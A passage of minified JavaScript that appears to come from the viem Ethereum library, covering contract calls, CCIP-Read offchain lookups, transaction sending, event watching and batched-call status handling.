c.name==="HttpRequestError"&&c.status?(0,i.encodeErrorResult)({abi:e.batchGatewayAbi,errorName:"HttpError",args:[c.status,c.shortMessage]}):(0,i.encodeErrorResult)({abi:[n.solidityError],errorName:"Error",args:["shortMessage"in c?c.shortMessage:c.message]})}})(nk)),nk}var BQ;function aM(){return BQ||(BQ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.offchainLookupAbiItem=t.offchainLookupSignature=void 0,t.offchainLookup=h,t.ccipRequest=m;const e=ZA(),n=VFe(),r=Zu(),i=$8(),s=Ku(),o=Ju(),a=os(),c=So(),l=Q8(),f=Ns();t.offchainLookupSignature="0x556f1830",t.offchainLookupAbiItem={name:"OffchainLookup",type:"error",inputs:[{name:"sender",type:"address"},{name:"urls",type:"string[]"},{name:"callData",type:"bytes"},{name:"callbackFunction",type:"bytes4"},{name:"extraData",type:"bytes"}]};async function h(b,{blockNumber:w,blockTag:y,data:E,to:A}){const{args:R}=(0,i.decodeErrorResult)({data:E,abi:[t.offchainLookupAbiItem]}),[S,v,k,O,_]=R,{ccipRead:I}=b,T=I&&typeof I?.request=="function"?I.request:m;try{if(!(0,o.isAddressEqual)(A,S))throw new n.OffchainLookupSenderMismatchError({sender:S,to:A});const B=v.includes(l.localBatchGatewayUrl)?await(0,l.localBatchGatewayRequest)({data:k,ccipRequest:T}):await T({data:k,sender:S,urls:v}),{data:U}=await(0,e.call)(b,{blockNumber:w,blockTag:y,data:(0,a.concat)([O,(0,s.encodeAbiParameters)([{type:"bytes"},{type:"bytes"}],[B,_])]),to:A});return U}catch(B){throw new n.OffchainLookupError({callbackSelector:O,cause:B,data:E,extraData:_,sender:S,urls:v})}}async function m({data:b,sender:w,urls:y}){let E=new Error("An unknown error occurred.");for(let A=0;A<y.length;A++){const R=y[A],S=R.includes("{data}")?"GET":"POST",v=S==="POST"?{data:b,sender:w}:void 0,k=S==="POST"?{"Content-Type":"application/json"}:{};try{const O=await fetch(R.replace("{sender}",w.toLowerCase()).replace("{data}",b),{body:JSON.stringify(v),headers:k,method:S});let _;if(O.headers.get("Content-Type")?.startsWith("application/json")?_=(await O.json()).data:_=await O.text(),!O.ok){E=new r.HttpRequestError({body:v,details:_?.error?(0,f.stringify)(_.error):O.statusText,headers:O.headers,status:O.status,url:R});continue}if(!(0,c.isHex)(_)){E=new n.OffchainLookupResponseMalformedError({result:_,url:R});continue}return _}catch(O){E=new r.HttpRequestError({body:v,details:O.message,url:R})}}throw E}})(tk)),tk}var jQ;function ZA(){if(jQ)return E2;jQ=1,Object.defineProperty(E2,"__esModule",{value:!0}),E2.call=v,E2.getRevertErrorData=T;const t=n0(),e=Ile(),n=Qr(),r=f0(),i=qFe(),s=WA(),o=Kt(),a=GA(),c=o0(),l=eh(),f=KA(),h=ma(),m=h0(),b=lt(),w=tM(),y=l0(),E=Yu(),A=rM(),R=qj(),S=Qu();async function v(B,U){const{account:M=B.account,authorizationList:N,batch:q=!!B.batch?.multicall,blockNumber:P,blockTag:C=B.experimental_blockTag??"latest",accessList:j,blobs:z,blockOverrides:$,code:H,data:L,factory:V,factoryData:G,gas:Z,gasPrice:J,maxFeePerBlobGas:ne,maxFeePerGas:re,maxPriorityFeePerGas:le,nonce:oe,to:ue,value:be,stateOverride:Me,...Te}=U,Oe=M?(0,n.parseAccount)(M):void 0;if(H&&(V||G))throw new o.BaseError("Cannot provide both `code` & `factory`/`factoryData` as parameters.");if(H&&ue)throw new o.BaseError("Cannot provide both `code` & `to` as parameters.");const Ke=H&&L,it=V&&G&&ue&&L,at=Ke||it,At=Ke?_({code:H,data:L}):it?I({data:L,factory:V,factoryData:G,to:ue}):L;try{(0,S.assertRequest)(U);const ze=(typeof P=="bigint"?(0,b.numberToHex)(P):void 0)||C,Re=$?e.toRpc($):void 0,xn=(0,R.serializeStateOverride)(Me),Ln=B.chain?.formatters?.transactionRequest?.format,Ne=(Ln||E.formatTransactionRequest)({...(0,y.extract)(Te,{format:Ln}),accessList:j,account:Oe,authorizationList:N,blobs:z,data:At,gas:Z,gasPrice:J,maxFeePerBlobGas:ne,maxFeePerGas:re,maxPriorityFeePerGas:le,nonce:oe,to:at?void 0:ue,value:be},"call");if(q&&k({request:Ne})&&!xn&&!Re)try{return await O(B,{...Ne,blockNumber:P,blockTag:C})}catch(dt){if(!(dt instanceof a.ClientChainNotConfiguredError)&&!(dt instanceof a.ChainDoesNotSupportContract))throw dt}const Ve=(()=>{const dt=[Ne,ze];return xn&&Re?[...dt,xn,Re]:xn?[...dt,xn]:Re?[...dt,{},Re]:dt})(),Qe=await B.request({method:"eth_call",params:Ve});return Qe==="0x"?{data:void 0}:{data:Qe}}catch(Et){const ze=T(Et),{offchainLookup:Re,offchainLookupSignature:xn}=await Promise.resolve().then(()=>aM());if(B.ccipRead!==!1&&ze?.slice(0,10)===xn&&ue)return{data:await Re(B,{data:ze,to:ue})};throw at&&ze?.slice(0,10)==="0x101bb98d"?new c.CounterfactualDeploymentFailedError({factory:V}):(0,w.getCallError)(Et,{...U,account:Oe,chain:B.chain})}}function k({request:B}){const{data:U,to:M,...N}=B;return!(!U||U.startsWith(i.aggregate3Signature)||!M||Object.values(N).filter(q=>typeof q<"u").length>0)}async function O(B,U){const{batchSize:M=1024,deployless:N=!1,wait:q=0}=typeof B.batch?.multicall=="object"?B.batch.multicall:{},{blockNumber:P,blockTag:C=B.experimental_blockTag??"latest",data:j,to:z}=U,$=(()=>{if(N)return null;if(U.multicallAddress)return U.multicallAddress;if(B.chain)return(0,m.getChainContractAddress)({blockNumber:P,chain:B.chain,contract:"multicall3"});throw new a.ClientChainNotConfiguredError})(),L=(typeof P=="bigint"?(0,b.numberToHex)(P):void 0)||C,{schedule:V}=(0,A.createBatchScheduler)({id:`${B.uid}.${L}`,wait:q,shouldSplitBatch(J){return J.reduce((re,{data:le})=>re+(le.length-2),0)>M*2},fn:async J=>{const ne=J.map(oe=>({allowFailure:!0,callData:oe.data,target:oe.to})),re=(0,h.encodeFunctionData)({abi:r.multicall3Abi,args:[ne],functionName:"aggregate3"}),le=await B.request({method:"eth_call",params:[{...$===null?{data:_({code:s.multicall3Bytecode,data:re})}:{to:$,data:re}},L]});return(0,l.decodeFunctionResult)({abi:r.multicall3Abi,args:[ne],functionName:"aggregate3",data:le||"0x"})}}),[{returnData:G,success:Z}]=await V({data:j,to:z});if(!Z)throw new c.RawContractError({data:G});return G==="0x"?{data:void 0}:{data:G}}function _(B){const{code:U,data:M}=B;return(0,f.encodeDeployData)({abi:(0,t.parseAbi)(["constructor(bytes, bytes)"]),bytecode:s.deploylessCallViaBytecodeBytecode,args:[U,M]})}function I(B){const{data:U,factory:M,factoryData:N,to:q}=B;return(0,f.encodeDeployData)({abi:(0,t.parseAbi)(["constructor(address, bytes, address, bytes)"]),bytecode:s.deploylessCallViaFactoryBytecode,args:[q,U,M,N]})}function T(B){if(!(B instanceof o.BaseError))return;const U=B.walk();return typeof U?.data=="object"?U.data?.data:U.data}return E2}var MQ;function ld(){if(MQ)return AC;MQ=1,Object.defineProperty(AC,"__esModule",{value:!0}),AC.readContract=s;const t=eh(),e=ma(),n=c0(),r=Pn(),i=ZA();async function s(o,a){const{abi:c,address:l,args:f,functionName:h,...m}=a,b=(0,e.encodeFunctionData)({abi:c,args:f,functionName:h});try{const{data:w}=await(0,r.getAction)(o,i.call,"call")({...m,data:b,to:l});return(0,t.decodeFunctionResult)({abi:c,args:f,functionName:h,data:w||"0x"})}catch(w){throw(0,n.getContractError)(w,{abi:c,address:l,args:f,docsPath:"/docs/contract/readContract",functionName:h})}}return AC}var kC={},UQ;function Rle(){if(UQ)return kC;UQ=1,Object.defineProperty(kC,"__esModule",{value:!0}),kC.simulateContract=o;const t=Qr(),e=eh(),n=ma(),r=c0(),i=Pn(),s=ZA();async function o(a,c){const{abi:l,address:f,args:h,dataSuffix:m,functionName:b,...w}=c,y=w.account?(0,t.parseAccount)(w.account):a.account,E=(0,n.encodeFunctionData)({abi:l,args:h,functionName:b});try{const{data:A}=await(0,i.getAction)(a,s.call,"call")({batch:!1,data:`${E}${m?m.replace("0x",""):""}`,to:f,...w,account:y}),R=(0,e.decodeFunctionResult)({abi:l,args:h,functionName:b,data:A||"0x"}),S=l.filter(v=>"name"in v&&v.name===c.functionName);return{result:R,request:{abi:S,address:f,args:h,dataSuffix:m,functionName:b,...w,account:y}}}catch(A){throw(0,r.getContractError)(A,{abi:l,address:f,args:h,docsPath:"/docs/contract/simulateContract",functionName:b,sender:y?.address})}}return kC}var DC={},rk={},LQ;function dy(){return LQ||(LQ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.cleanupCache=t.listenersCache=void 0,t.observe=n,t.listenersCache=new Map,t.cleanupCache=new Map;let e=0;function n(r,i,s){const o=++e,a=()=>t.listenersCache.get(r)||[],c=()=>{const b=a();t.listenersCache.set(r,b.filter(w=>w.id!==o))},l=()=>{const b=a();if(!b.some(y=>y.id===o))return;const w=t.cleanupCache.get(r);if(b.length===1&&w){const y=w();y instanceof Promise&&y.catch(()=>{})}c()},f=a();if(t.listenersCache.set(r,[...f,{id:o,fns:i}]),f&&f.length>0)return l;const h={};for(const b in i)h[b]=((...w)=>{const y=a();if(y.length!==0)for(const E of y)E.fns[b]?.(...w)});const m=s(h);return typeof m=="function"&&t.cleanupCache.set(r,m),l}})(rk)),rk}var BC={},jC={},FQ;function cM(){if(FQ)return jC;FQ=1,Object.defineProperty(jC,"__esModule",{value:!0}),jC.wait=t;async function t(e){return new Promise(n=>setTimeout(n,e))}return jC}var $Q;function vw(){if($Q)return BC;$Q=1,Object.defineProperty(BC,"__esModule",{value:!0}),BC.poll=e;const t=cM();function e(n,{emitOnBegin:r,initialWaitTime:i,interval:s}){let o=!0;const a=()=>o=!1;return(async()=>{let l;r&&(l=await n({unpoll:a}));const f=await i?.(l)??s;await(0,t.wait)(f);const h=async()=>{o&&(await n({unpoll:a}),await(0,t.wait)(s),h())};h()})(),a}return BC}var I2={},ik={},HQ;function Ple(){return HQ||(HQ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.responseCache=t.promiseCache=void 0,t.getCache=e,t.withCache=n,t.promiseCache=new Map,t.responseCache=new Map;function e(r){const i=(a,c)=>({clear:()=>c.delete(a),get:()=>c.get(a),set:l=>c.set(a,l)}),s=i(r,t.promiseCache),o=i(r,t.responseCache);return{clear:()=>{s.clear(),o.clear()},promise:s,response:o}}async function n(r,{cacheKey:i,cacheTime:s=Number.POSITIVE_INFINITY}){const o=e(i),a=o.response.get();if(a&&s>0&&Date.now()-a.created.getTime()<s)return a.data;let c=o.promise.get();c||(c=r(),o.promise.set(c));try{const l=await c;return o.response.set({created:new Date,data:l}),l}finally{o.promise.clear()}}})(ik)),ik}var zQ;function YA(){if(zQ)return I2;zQ=1,Object.defineProperty(I2,"__esModule",{value:!0}),I2.getBlockNumberCache=n,I2.getBlockNumber=r;const t=Ple(),e=i=>`blockNumber.${i}`;function n(i){return(0,t.getCache)(e(i))}async function r(i,{cacheTime:s=i.cacheTime}={}){const o=await(0,t.withCache)(()=>i.request({method:"eth_blockNumber"}),{cacheKey:e(i.uid),cacheTime:s});return BigInt(o)}return I2}var MC={},qQ;function J8(){if(qQ)return MC;qQ=1,Object.defineProperty(MC,"__esModule",{value:!0}),MC.getFilterChanges=n;const t=VA(),e=Xf();async function n(r,{filter:i}){const s="strict"in i&&i.strict,o=await i.request({method:"eth_getFilterChanges",params:[i.id]});if(typeof o[0]=="string")return o;const a=o.map(c=>(0,e.formatLog)(c));return!("abi"in i)||!i.abi?a:(0,t.parseEventLogs)({abi:i.abi,logs:a,strict:s})}return MC}var UC={},VQ;function X8(){if(VQ)return UC;VQ=1,Object.defineProperty(UC,"__esModule",{value:!0}),UC.uninstallFilter=t;async function t(e,{filter:n}){return n.request({method:"eth_uninstallFilter",params:[n.id]})}return UC}var WQ;function Nle(){if(WQ)return DC;WQ=1,Object.defineProperty(DC,"__esModule",{value:!0}),DC.watchContractEvent=w;const t=$r(),e=a0(),n=qA(),r=oy(),i=Xf(),s=Pn(),o=dy(),a=vw(),c=Ns(),l=Uj(),f=YA(),h=eM(),m=J8(),b=X8();function w(y,E){const{abi:A,address:R,args:S,batch:v=!0,eventName:k,fromBlock:O,onError:_,onLogs:I,poll:T,pollingInterval:B=y.pollingInterval,strict:U}=E;return(typeof T<"u"?T:typeof O=="bigint"?!0:!(y.transport.type==="webSocket"||y.transport.type==="ipc"||y.transport.type==="fallback"&&(y.transport.transports[0].config.type==="webSocket"||y.transport.transports[0].config.type==="ipc")))?(()=>{const P=U??!1,C=(0,c.stringify)(["watchContractEvent",R,S,v,y.uid,k,B,P,O]);return(0,o.observe)(C,{onLogs:I,onError:_},j=>{let z;O!==void 0&&(z=O-1n);let $,H=!1;const L=(0,a.poll)(async()=>{if(!H){try{$=await(0,s.getAction)(y,l.createContractEventFilter,"createContractEventFilter")({abi:A,address:R,args:S,eventName:k,strict:P,fromBlock:O})}catch{}H=!0;return}try{let V;if($)V=await(0,s.getAction)(y,m.getFilterChanges,"getFilterChanges")({filter:$});else{const G=await(0,s.getAction)(y,f.getBlockNumber,"getBlockNumber")({});z&&z<G?V=await(0,s.getAction)(y,h.getContractEvents,"getContractEvents")({abi:A,address:R,args:S,eventName:k,fromBlock:z+1n,toBlock:G,strict:P}):V=[],z=G}if(V.length===0)return;if(v)j.onLogs(V);else for(const G of V)j.onLogs([G])}catch(V){$&&V instanceof e.InvalidInputRpcError&&(H=!1),j.onError?.(V)}},{emitOnBegin:!0,interval:B});return async()=>{$&&await(0,s.getAction)(y,b.uninstallFilter,"uninstallFilter")({filter:$}),L()}})})():(()=>{const P=U??!1,C=(0,c.stringify)(["watchContractEvent",R,S,v,y.uid,k,B,P]);let j=!0,z=()=>j=!1;return(0,o.observe)(C,{onLogs:I,onError:_},$=>((async()=>{try{const H=(()=>{if(y.transport.type==="fallback"){const G=y.transport.transports.find(Z=>Z.config.type==="webSocket"||Z.config.type==="ipc");return G?G.value:y.transport}return y.transport})(),L=k?(0,r.encodeEventTopics)({abi:A,eventName:k,args:S}):[],{unsubscribe:V}=await H.subscribe({params:["logs",{address:R,topics:L}],onData(G){if(!j)return;const Z=G.result;try{const{eventName:J,args:ne}=(0,n.decodeEventLog)({abi:A,data:Z.data,topics:Z.topics,strict:U}),re=(0,i.formatLog)(Z,{args:ne,eventName:J});$.onLogs([re])}catch(J){let ne,re;if(J instanceof t.DecodeLogDataMismatch||J instanceof t.DecodeLogTopicsMismatch){if(U)return;ne=J.abiItem.name,re=J.abiItem.inputs?.some(oe=>!("name"in oe&&oe.name))}const le=(0,i.formatLog)(Z,{args:re?[]:{},eventName:ne});$.onLogs([le])}},onError(G){$.onError?.(G)}});z=V,j||z()}catch(H){_?.(H)}})(),()=>z()))})()}return DC}var R2={},dm={},GQ;function p0(){if(GQ)return dm;GQ=1,Object.defineProperty(dm,"__esModule",{value:!0}),dm.AccountTypeNotSupportedError=dm.AccountNotFoundError=void 0;const t=Kt();class e extends t.BaseError{constructor({docsPath:i}={}){super(["Could not find an Account to execute with this Action.","Please provide an Account with the `account` argument on the Action, or by supplying an `account` to the Client."].join(`
`),{docsPath:i,docsSlug:"account",name:"AccountNotFoundError"})}}dm.AccountNotFoundError=e;class n extends t.BaseError{constructor({docsPath:i,metaMessages:s,type:o}){super(`Account type "${o}" is not supported.`,{docsPath:i,metaMessages:s,name:"AccountTypeNotSupportedError"})}}return dm.AccountTypeNotSupportedError=n,dm}var LC={},FC={},KQ;function QA(){if(KQ)return FC;KQ=1,Object.defineProperty(FC,"__esModule",{value:!0}),FC.assertCurrentChain=e;const t=GA();function e({chain:n,currentChainId:r}){if(!n)throw new t.ChainNotFoundError;if(r!==n.id)throw new t.ChainMismatchError({chain:n,currentChainId:r})}return FC}var $C={},ZQ;function uM(){if(ZQ)return $C;ZQ=1,Object.defineProperty($C,"__esModule",{value:!0}),$C.sendRawTransaction=t;async function t(e,{serializedTransaction:n}){return e.request({method:"eth_sendRawTransaction",params:[n]},{retryCount:0})}return $C}var YQ;function eR(){if(YQ)return LC;YQ=1,Object.defineProperty(LC,"__esModule",{value:!0}),LC.sendTransaction=y;const t=Qr(),e=p0(),n=Kt(),r=UA(),i=QA(),s=HA(),o=l0(),a=Yu(),c=Pn(),l=iy(),f=Qu(),h=d0(),m=zA(),b=uM(),w=new l.LruMap(128);async function y(E,A){const{account:R=E.account,chain:S=E.chain,accessList:v,authorizationList:k,blobs:O,data:_,gas:I,gasPrice:T,maxFeePerBlobGas:B,maxFeePerGas:U,maxPriorityFeePerGas:M,nonce:N,type:q,value:P,...C}=A;if(typeof R>"u")throw new e.AccountNotFoundError({docsPath:"/docs/actions/wallet/sendTransaction"});const j=R?(0,t.parseAccount)(R):null;try{(0,f.assertRequest)(A);const z=await(async()=>{if(A.to)return A.to;if(A.to!==null&&k&&k.length>0)return await(0,r.recoverAuthorizationAddress)({authorization:k[0]}).catch(()=>{throw new n.BaseError("`to` is required. Could not infer from `authorizationList`.")})})();if(j?.type==="json-rpc"||j===null){let $;S!==null&&($=await(0,c.getAction)(E,h.getChainId,"getChainId")({}),(0,i.assertCurrentChain)({currentChainId:$,chain:S}));const H=E.chain?.formatters?.transactionRequest?.format,V=(H||a.formatTransactionRequest)({...(0,o.extract)(C,{format:H}),accessList:v,account:j,authorizationList:k,blobs:O,chainId:$,data:_,gas:I,gasPrice:T,maxFeePerBlobGas:B,maxFeePerGas:U,maxPriorityFeePerGas:M,nonce:N,to:z,type:q,value:P},"sendTransaction"),G=w.get(E.uid),Z=G?"wallet_sendTransaction":"eth_sendTransaction";try{return await E.request({method:Z,params:[V]},{retryCount:0})}catch(J){if(G===!1)throw J;const ne=J;if(ne.name==="InvalidInputRpcError"||ne.name==="InvalidParamsRpcError"||ne.name==="MethodNotFoundRpcError"||ne.name==="MethodNotSupportedRpcError")return await E.request({method:"wallet_sendTransaction",params:[V]},{retryCount:0}).then(re=>(w.set(E.uid,!0),re)).catch(re=>{const le=re;throw le.name==="MethodNotFoundRpcError"||le.name==="MethodNotSupportedRpcError"?(w.set(E.uid,!1),ne):le});throw ne}}if(j?.type==="local"){const $=await(0,c.getAction)(E,m.prepareTransactionRequest,"prepareTransactionRequest")({account:j,accessList:v,authorizationList:k,blobs:O,chain:S,data:_,gas:I,gasPrice:T,maxFeePerBlobGas:B,maxFeePerGas:U,maxPriorityFeePerGas:M,nonce:N,nonceManager:j.nonceManager,parameters:[...m.defaultParameters,"sidecars"],type:q,value:P,...C,to:z}),H=S?.serializers?.transaction,L=await j.signTransaction($,{serializer:H});return await(0,c.getAction)(E,b.sendRawTransaction,"sendRawTransaction")({serializedTransaction:L})}throw j?.type==="smart"?new e.AccountTypeNotSupportedError({metaMessages:["Consider using the `sendUserOperation` Action instead."],docsPath:"/docs/actions/bundler/sendUserOperation",type:"smart"}):new e.AccountTypeNotSupportedError({docsPath:"/docs/actions/wallet/sendTransaction",type:j?.type})}catch(z){throw z instanceof e.AccountTypeNotSupportedError?z:(0,s.getTransactionError)(z,{...A,account:j,chain:A.chain||void 0})}}return LC}var QQ;function lM(){if(QQ)return R2;QQ=1,Object.defineProperty(R2,"__esModule",{value:!0}),R2.writeContract=o;const t=Qr(),e=p0(),n=ma(),r=c0(),i=Pn(),s=eR();async function o(a,c){return o.internal(a,s.sendTransaction,"sendTransaction",c)}return(function(a){async function c(l,f,h,m){const{abi:b,account:w=l.account,address:y,args:E,dataSuffix:A,functionName:R,...S}=m;if(typeof w>"u")throw new e.AccountNotFoundError({docsPath:"/docs/contract/writeContract"});const v=w?(0,t.parseAccount)(w):null,k=(0,n.encodeFunctionData)({abi:b,args:E,functionName:R});try{return await(0,i.getAction)(l,f,h)({data:`${k}${A?A.replace("0x",""):""}`,to:y,account:v,...S})}catch(O){throw(0,r.getContractError)(O,{abi:b,address:y,args:E,docsPath:"/docs/contract/writeContract",functionName:R,sender:v?.address})}}a.internal=c})(o||(R2.writeContract=o={})),R2}var JQ;function WFe(){if(JQ)return mb;JQ=1,Object.defineProperty(mb,"__esModule",{value:!0}),mb.getContract=c,mb.getFunctionParameters=l,mb.getEventParameters=f;const t=Pn(),e=Uj(),n=Sle(),r=eM(),i=ld(),s=Rle(),o=Nle(),a=lM();function c({abi:h,address:m,client:b}){const w=b,[y,E]=w?"public"in w&&"wallet"in w?[w.public,w.wallet]:"public"in w?[w.public,void 0]:"wallet"in w?[void 0,w.wallet]:[w,w]:[void 0,void 0],A=y!=null,R=E!=null,S={};let v=!1,k=!1,O=!1;for(const _ of h)if(_.type==="function"?_.stateMutability==="view"||_.stateMutability==="pure"?v=!0:k=!0:_.type==="event"&&(O=!0),v&&k&&O)break;return A&&(v&&(S.read=new Proxy({},{get(_,I){return(...T)=>{const{args:B,options:U}=l(T);return(0,t.getAction)(y,i.readContract,"readContract")({abi:h,address:m,functionName:I,args:B,...U})}}})),k&&(S.simulate=new Proxy({},{get(_,I){return(...T)=>{const{args:B,options:U}=l(T);return(0,t.getAction)(y,s.simulateContract,"simulateContract")({abi:h,address:m,functionName:I,args:B,...U})}}})),O&&(S.createEventFilter=new Proxy({},{get(_,I){return(...T)=>{const B=h.find(N=>N.type==="event"&&N.name===I),{args:U,options:M}=f(T,B);return(0,t.getAction)(y,e.createContractEventFilter,"createContractEventFilter")({abi:h,address:m,eventName:I,args:U,...M})}}}),S.getEvents=new Proxy({},{get(_,I){return(...T)=>{const B=h.find(N=>N.type==="event"&&N.name===I),{args:U,options:M}=f(T,B);return(0,t.getAction)(y,r.getContractEvents,"getContractEvents")({abi:h,address:m,eventName:I,args:U,...M})}}}),S.watchEvent=new Proxy({},{get(_,I){return(...T)=>{const B=h.find(N=>N.type==="event"&&N.name===I),{args:U,options:M}=f(T,B);return(0,t.getAction)(y,o.watchContractEvent,"watchContractEvent")({abi:h,address:m,eventName:I,args:U,...M})}}}))),R&&k&&(S.write=new Proxy({},{get(_,I){return(...T)=>{const{args:B,options:U}=l(T);return(0,t.getAction)(E,a.writeContract,"writeContract")({abi:h,address:m,functionName:I,args:B,...U})}}})),(A||R)&&k&&(S.estimateGas=new Proxy({},{get(_,I){return(...T)=>{const{args:B,options:U}=l(T),M=y??E;return(0,t.getAction)(M,n.estimateContractGas,"estimateContractGas")({abi:h,address:m,functionName:I,args:B,...U,account:U.account??E.account})}}})),S.address=m,S.abi=h,S}function l(h){const m=h.length&&Array.isArray(h[0]),b=m?h[0]:[],w=(m?h[1]:h[0])??{};return{args:b,options:w}}function f(h,m){let b=!1;Array.isArray(h[0])?b=!0:h.length===1?b=m.inputs.some(E=>E.indexed):h.length===2&&(b=!0);const w=b?h[0]:void 0,y=(b?h[1]:h[0])??{};return{args:w,options:y}}return mb}var Sb={},P2={},XQ;function Ole(){if(XQ)return P2;XQ=1,Object.defineProperty(P2,"__esModule",{value:!0}),P2.BundleFailedError=void 0;const t=Kt();class e extends t.BaseError{constructor(r){super(`Call bundle failed with status: ${r.statusCode}`,{name:"BundleFailedError"}),Object.defineProperty(this,"result",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.result=r}}return P2.BundleFailedError=e,P2}var HC={},eJ;function tR(){if(eJ)return HC;eJ=1,Object.defineProperty(HC,"__esModule",{value:!0}),HC.withRetry=e;const t=cM();function e(n,{delay:r=100,retryCount:i=2,shouldRetry:s=()=>!0}={}){return new Promise((o,a)=>{const c=async({count:l=0}={})=>{const f=async({error:h})=>{const m=typeof r=="function"?r({count:l,error:h}):r;m&&await(0,t.wait)(m),c({count:l+1})};try{const h=await n();o(h)}catch(h){if(l<i&&await s({count:l,error:h}))return f({error:h});a(h)}};c()})}return HC}var zC={},sk={},tJ;function JA(){return tJ||(tJ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.defineTransactionReceipt=t.receiptStatuses=void 0,t.formatTransactionReceipt=s;const e=ci(),n=FA(),r=Xf(),i=ww();t.receiptStatuses={"0x0":"reverted","0x1":"success"};function s(o,a){const c={...o,blockNumber:o.blockNumber?BigInt(o.blockNumber):null,contractAddress:o.contractAddress?o.contractAddress:null,cumulativeGasUsed:o.cumulativeGasUsed?BigInt(o.cumulativeGasUsed):null,effectiveGasPrice:o.effectiveGasPrice?BigInt(o.effectiveGasPrice):null,gasUsed:o.gasUsed?BigInt(o.gasUsed):null,logs:o.logs?o.logs.map(l=>(0,r.formatLog)(l)):null,to:o.to?o.to:null,transactionIndex:o.transactionIndex?(0,e.hexToNumber)(o.transactionIndex):null,status:o.status?t.receiptStatuses[o.status]:null,type:o.type?i.transactionType[o.type]||o.type:null};return o.blobGasPrice&&(c.blobGasPrice=BigInt(o.blobGasPrice)),o.blobGasUsed&&(c.blobGasUsed=BigInt(o.blobGasUsed)),c}t.defineTransactionReceipt=(0,n.defineFormatter)("transactionReceipt",s)})(sk)),sk}var ok={},nJ;function dM(){return nJ||(nJ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.fallbackTransactionErrorMagicIdentifier=t.fallbackMagicIdentifier=void 0,t.sendCalls=f;const e=Qr(),n=Kt(),r=a0(),i=ma(),s=os(),o=ci(),a=lt(),c=HA(),l=eR();t.fallbackMagicIdentifier="0x5792579257925792579257925792579257925792579257925792579257925792",t.fallbackTransactionErrorMagicIdentifier=(0,a.numberToHex)(0,{size:32});async function f(h,m){const{account:b=h.account,capabilities:w,chain:y=h.chain,experimental_fallback:E,experimental_fallbackDelay:A=32,forceAtomic:R=!1,id:S,version:v="2.0.0"}=m,k=b?(0,e.parseAccount)(b):null,O=m.calls.map(_=>{const I=_,T=I.abi?(0,i.encodeFunctionData)({abi:I.abi,functionName:I.functionName,args:I.args}):I.data;return{data:I.dataSuffix&&T?(0,s.concat)([T,I.dataSuffix]):T,to:I.to,value:I.value?(0,a.numberToHex)(I.value):void 0}});try{const _=await h.request({method:"wallet_sendCalls",params:[{atomicRequired:R,calls:O,capabilities:w,chainId:(0,a.numberToHex)(y.id),from:k?.address,id:S,version:v}]},{retryCount:0});return typeof _=="string"?{id:_}:_}catch(_){const I=_;if(E&&(I.name==="MethodNotFoundRpcError"||I.name==="MethodNotSupportedRpcError"||I.name==="UnknownRpcError"||I.details.toLowerCase().includes("does not exist / is not available")||I.details.toLowerCase().includes("missing or invalid. request()")||I.details.toLowerCase().includes("did not match any variant of untagged enum")||I.details.toLowerCase().includes("account upgraded to unsupported contract")||I.details.toLowerCase().includes("eip-7702 not supported")||I.details.toLowerCase().includes("unsupported wc_ method")||I.details.toLowerCase().includes("feature toggled misconfigured")||I.details.toLowerCase().includes("jsonrpcengine: response has no error or result for request"))){if(w&&Object.values(w).some(N=>!N.optional)){const N="non-optional `capabilities` are not supported on fallback to `eth_sendTransaction`.";throw new r.UnsupportedNonOptionalCapabilityError(new n.BaseError(N,{details:N}))}if(R&&O.length>1){const M="`forceAtomic` is not supported on fallback to `eth_sendTransaction`.";throw new r.AtomicityNotSupportedError(new n.BaseError(M,{details:M}))}const T=[];for(const M of O){const N=(0,l.sendTransaction)(h,{account:k,chain:y,data:M.data,to:M.to,value:M.value?(0,o.hexToBigInt)(M.value):void 0});T.push(N),A>0&&await new Promise(q=>setTimeout(q,A))}const B=await Promise.allSettled(T);if(B.every(M=>M.status==="rejected"))throw B[0].reason;const U=B.map(M=>M.status==="fulfilled"?M.value:t.fallbackTransactionErrorMagicIdentifier);return{id:(0,s.concat)([...U,(0,a.numberToHex)(y.id,{size:32}),t.fallbackMagicIdentifier])}}throw(0,c.getTransactionError)(_,{...m,account:k,chain:m.chain})}}})(ok)),ok}var rJ;function kle(){if(rJ)return zC;rJ=1,Object.defineProperty(zC,"__esModule",{value:!0}),zC.getCallsStatus=s;const t=Jc(),e=Yf(),n=ci(),r=JA(),i=dM();async function s(o,a){async function c(E){if(E.endsWith(i.fallbackMagicIdentifier.slice(2))){const R=(0,e.trim)((0,t.sliceHex)(E,-64,-32)),S=(0,t.sliceHex)(E,0,-64).slice(2).match(/.{1,64}/g),v=await Promise.all(S.map(O=>i.fallbackTransactionErrorMagicIdentifier.slice(2)!==O?o.request({method:"eth_getTransactionReceipt",params:[`0x${O}`]},{dedupe:!0}):void 0)),k=v.some(O=>O===null)?100:v.every(O=>O?.status==="0x1")?200:v.every(O=>O?.status==="0x0")?500:600;return{atomic:!1,chainId:(0,n.hexToNumber)(R),receipts:v.filter(Boolean),status:k,version:"2.0.0"}}return o.request({method:"wallet_getCallsStatus",params:[E]})}const{atomic:l=!1,chainId:f,receipts:h,version:m="2.0.0",...b}=await c(a.id),[w,y]=(()=>{const E=b.status;return E>=100&&E<200?["pending",E]:E>=200&&E<300?["success",E]:E>=300&&E<700?["failure",E]:E==="CONFIRMED"?["success",200]:E==="PENDING"?["pending",100]:[void 0,E]})();return{...b,atomic:l,chainId:f?(0,n.hexToNumber)(f):void 0,receipts:h?.map(E=>({...E,blockNumber:(0,n.hexToBigInt)(E.blockNumber),gasUsed:(0,n.hexToBigInt)(E.gasUsed),status:r.receiptStatuses[E.status]}))??[],statusCode:y,status:w,version:m}}return zC}var iJ;function fM(){if(iJ)return Sb;iJ=1,Object.defineProperty(Sb,"__esModule",{value:!0}),Sb.WaitForCallsStatusTimeoutError=void 0,Sb.waitForCallsStatus=l;const t=Kt(),e=Ole(),n=Pn(),r=dy(),i=vw(),s=nM(),o=tR(),a=Ns(),c=kle();async function l(h,m){const{id:b,pollingInterval:w=h.pollingInterval,status:y=({statusCode:B})=>B===200||B>=300,retryCount:E=4,retryDelay:A=({count:B})=>~~(1<<B)*200,timeout:R=6e4,throwOnFailure:S=!1}=m,v=(0,a.stringify)(["waitForCallsStatus",h.uid,b]),{promise:k,resolve:O,reject:_}=(0,s.withResolvers)();let I;const 